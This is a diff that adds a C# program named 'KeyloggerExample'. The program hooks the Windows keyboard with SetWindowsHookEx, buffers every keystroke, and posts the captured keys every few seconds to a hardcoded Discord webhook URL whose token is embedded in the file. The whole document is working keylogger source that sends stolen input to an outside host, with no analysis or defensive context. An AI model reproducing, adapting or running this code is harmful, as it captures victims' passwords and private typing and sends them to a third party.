@@ -1,0 +1,104 @@
+using System;
+using System.Diagnostics;
+using System.Net.Http;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Newtonsoft.Json;
+
+namespace KeyloggerExample
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
+        [DllImport("user32.dll")]
+        private static extern bool UnhookWindowsHookEx(IntPtr hHook);
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+        private static StringBuilder _keyBuffer = new StringBuilder();
+        private static readonly string webhookUrl = "https://discord.com/api/webhooks/1301359953885532162/OjqOTz3TAfkzswMWkK-_C9TmMdHe05H6DHu0-H0BPooZTsAzNxF_Qk0hAm_3vm-ltlT0";
+
+        static async Task Main(string[] args)
+        {
+            _hookID = SetHook(_proc);
+            Console.WriteLine("Keylogger started. Collecting keystrokes for 10 seconds...");
+
+            System.Threading.Timer timer = new System.Threading.Timer(async (e) => await StopLogging(), null, 10000, Timeout.Infinite);
+            System.Threading.Timer sendTimer = new System.Threading.Timer(async (e) => await SendKeystrokesToWebhook(), null, 5000, 5000);
+
+            Application.Run();
+
+            UnhookWindowsHookEx(_hookID);
+            Console.WriteLine("Keylogger stopped.");
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)0x100)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                _keyBuffer.Append((Keys)vkCode + " ");
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        private static async Task StopLogging()
+        {
+            Application.ExitThread();
+            await SendKeystrokesToWebhook();
+        }
+
+        private static async Task SendKeystrokesToWebhook()
+        {
+            if (_keyBuffer.Length > 0)
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    var payload = new
+                    {
+                        content = $"```Keystrokes: {_keyBuffer.ToString()}```"
+                    };
+
+                    var jsonPayload = JsonConvert.SerializeObject(payload);
+                    var httpContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+
+                    try
+                    {
+                        HttpResponseMessage response = await client.PostAsync(webhookUrl, httpContent);
+                        if (!response.IsSuccessStatusCode)
+                        {
+                            Console.WriteLine($"Failed to send keystrokes. Status code: {response.StatusCode}");
+                        }
+                        else
+                        {
+                            _keyBuffer.Clear();
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Error sending keystrokes: {ex.Message}");
+                    }
+                }
+            }
+        }
+    }
+}
